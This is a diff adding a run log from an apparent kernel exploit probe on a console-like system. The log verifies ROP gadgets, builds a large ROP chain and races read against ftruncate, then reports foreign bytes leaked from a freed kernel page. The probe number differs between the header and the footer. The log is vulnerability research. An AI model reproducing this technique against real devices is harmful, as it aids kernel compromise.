@@ -1,0 +1,48 @@
+=== PROBE 1531a: MLFS read vs ftruncate ===
+
+fn_addr=0x000000082FF80B57 pid=186
+
+[A] gadget verification
+eboot=0x0000000040110000
+  pop_rax=OK pop_rdi=OK pop_rsi=OK pop_rdx=OK ret=OK pop_rsp=OK
+
+[B] MLFS file
+  open(/av_contents/content_tmp/r1531.bin, O_CREAT|O_RDWR) -> 31
+  ftruncate(31, 0x8000) rv=0
+  child descriptor -> 32
+  destination mmap -> 0x0000000311AEC000
+  control channel mmap -> 0x0000000311AF0000
+  leak channel mmap -> 0x0000000311AF4000
+  both destinations zeroed
+  marker readback bytes=4096
+  marker readback lands 0x41 in V: true
+
+[C] child chain
+  stack mmap -> 0x0000000314A30000 need=2708568 alloc=2719744
+  building TCB
+  TCB at 0x314a30000 fs_ptr at 0x314a31000
+  concatenating 336012 qwords
+  chain qwords=336012 bytes=2688096 alloc=2719744 stack=0x0000000314A30000
+  chain write head_ok=true tail_ok=true
+
+[D] race
+  thr_new rv=0 child_tid=102106
+  positive control: oracle channel holds the marker page = true
+  positive control: liveness channel delivered = true
+  round 10 sampled=20 dead=9 foreign=585
+  round 20 sampled=40 dead=17 foreign=1105
+  round 30 sampled=60 dead=29 foreign=1885
+  round 40 sampled=80 dead=42 foreign=2730
+  round 50 sampled=100 dead=55 foreign=3575
+  round 60 sampled=120 dead=67 foreign=4290
+  rounds=60 cycles=2 samples=120 dead=67 foreign_bytes=4290
+  child delivered per quarter: 16 15 10 12 (of 15 each)
+  first foreign: round 2 cycle 1 byte 1: 41 41 41 41 41
+  control: main read page 1 after regrow 120 times, non-zero 66 of them
+
+[E] verdict
+  *** FOREIGN BYTES IN THE READ DESTINATION ***
+  the kernel copied out of a page it had already released
+  final pid=186 expected 186
+
+=== PROBE 1530a COMPLETE ===
